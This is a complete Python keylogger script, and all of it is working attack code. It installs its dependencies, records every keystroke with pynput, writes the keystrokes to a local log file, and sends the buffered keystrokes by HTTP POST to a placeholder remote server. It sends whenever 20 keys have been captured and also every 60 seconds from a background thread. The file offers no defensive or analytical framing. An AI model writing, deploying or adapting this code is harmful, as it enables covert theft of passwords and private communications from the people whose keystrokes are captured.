import subprocess
import os
import logging
import requests
from pynput import keyboard
import time

# Function to install dependencies
def install_dependencies():
    dependencies = ['pynput', 'requests']
    subprocess.check_call([os.sys.executable, '-m', 'pip', 'install'] + dependencies)

# Buffer to store keystrokes before sending
keystroke_buffer = []

# Function to log keystrokes
def on_press(key):
    global keystroke_buffer
    try:
        keystroke_data = f"Key pressed: {key.char}"
    except AttributeError:
        keystroke_data = f"Special key pressed: {key}"
    
    # Log locally
    logging.info(keystroke_data)
    
    # Add to buffer
    keystroke_buffer.append(keystroke_data)
    
    # If buffer reaches certain size, send the data
    if len(keystroke_buffer) >= 20:  # Adjust this number as needed
        send_data()

def send_data():
    global keystroke_buffer
    if not keystroke_buffer:
        return
        
    try:
        # Replace with the URL of your receiving server
        url = "http://receiving-computer-ip:port/log"
        data = {"keystrokes": "\n".join(keystroke_buffer)}
        
        # Send the data
        response = requests.post(url, json=data)
        if response.status_code == 200:
            keystroke_buffer = []  # Clear buffer after successful send
    except Exception as e:
        logging.error(f"Failed to send data: {e}")

def start_keylogger():
    # Configure logging
    logging.basicConfig(filename='keylogger.log', level=logging.INFO, format='%(asctime)s - %(message)s')
    
    # Start periodic sending of data (every 60 seconds)
    def send_periodically():
        while True:
            send_data()
            time.sleep(60)
    
    # Start the periodic sender in a separate thread
    import threading
    sender_thread = threading.Thread(target=send_periodically, daemon=True)
    sender_thread.start()
    
    # Start listening to keystrokes
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

if __name__ == "__main__":
    install_dependencies()
    start_keylogger()
